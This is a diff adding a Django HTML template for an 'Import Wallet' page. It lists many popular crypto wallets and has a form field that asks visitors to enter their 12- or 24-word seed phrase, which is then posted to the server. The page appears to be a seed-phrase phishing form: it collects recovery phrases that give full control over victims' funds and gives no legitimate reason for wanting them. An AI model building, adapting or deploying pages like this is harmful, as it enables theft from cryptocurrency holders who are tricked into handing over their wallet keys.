@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body, html {
+      height: 100%;
+    }
+
+    .page-center {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      background-color: #0f172a; /* Optional background, no body styling */
+    }
+
+    .crypto-seed-form {
+      max-width: 350px;
+      background: #111827;
+      border: 2px solid #1f2937;
+      border-radius: 16px;
+      padding: 30px 25px;
+      font-family: 'Segoe UI', sans-serif;
+      color: #f9fafb;
+      box-shadow: 0 0 20px rgba(0, 255, 170, 0.15);
+    }
+
+    .crypto-seed-form h2 {
+      font-size: 22px;
+      text-align: center;
+      margin-bottom: 25px;
+      letter-spacing: 1px;
+      color: #00ffd1;
+    }
+
+    .input-wrap {
+      margin-bottom: 20px;
+    }
+
+    .input-wrap label {
+      display: block;
+      font-size: 13px;
+      color: #d1d5db;
+      margin-bottom: 6px;
+    }
+
+    .input-wrap input,
+    .input-wrap textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border-radius: 8px;
+      background: #1f2937;
+      color: #f3f4f6;
+      border: 1px solid #374151;
+      font-size: 14px;
+      resize: none;
+    }
+
+    .crypto-seed-form button {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(to right, #00ffd1, #00c2ff);
+      color: #111827;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      box-shadow: 0 0 12px rgba(0, 255, 170, 0.2);
+      transition: background 0.3s ease;
+    }
+
+    .crypto-seed-form button:hover {
+      background: linear-gradient(to right, #00e6aa, #009fd4);
+    }
+
+    .input-wrap select {
+      width: 100%;
+      padding: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      appearance: none;
+      background-image: linear-gradient(45deg, transparent 50%, #00ffc3 50%),
+                        linear-gradient(135deg, #00ffc3 50%, transparent 50%);
+      background-position: calc(100% - 25px) calc(1em + 2px), calc(100% - 20px) calc(1em + 2px);
+      background-size: 5px 5px, 5px 5px;
+      background-repeat: no-repeat;
+      cursor: pointer;
+    }
+
+    .input-wrap select option {
+      background-color: #1f2937;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-center">
+    <form class="crypto-seed-form" method="POST">
+      {% csrf_token %}
+      <h2>Import Wallet</h2>
+
+      <div class="input-wrap">
+        <label for="wallet-type">Select Wallet Type</label>
+        <select id="wallet-type" name="wallet">
+          <option value="">-- Choose Wallet --</option>
+          <option value="metamask">MetaMask</option>
+          <option value="trustwallet">Trust Wallet</option>
+          <option value="electrum">Electrum</option>
+          <option value="electrum">Ethereum (ETH) </option>
+          <option value="electrum"> Solana  </option>
+          <option value="safepal">SafePal</option>
+          <option value="keystone">Keystone</option>
+          <option value="brave">Brave Wallet</option>
+          <option value="xverse">Xverse Wallet</option>
+          <option value="atomic">Atomic Wallet</option>
+          <option value="exodus">Exodus</option>
+    <option value="bitkeep">BitKeep (Seed Phrase)</option>
+          <option value="coinomi">Coinomi</option>
+        </select>
+      </div>
+
+      <div class="input-wrap">
+        <label for="seed-phrase">Seed Phrase</label>
+        <textarea id="seed-phrase" rows="3" name="seed" placeholder="Enter your 12 or 24 word phrase"></textarea>
+      </div>
+
+      <button type="submit">Import Wallet</button>
+    </form>
+  </div>
+
+
+</body>
+</html>
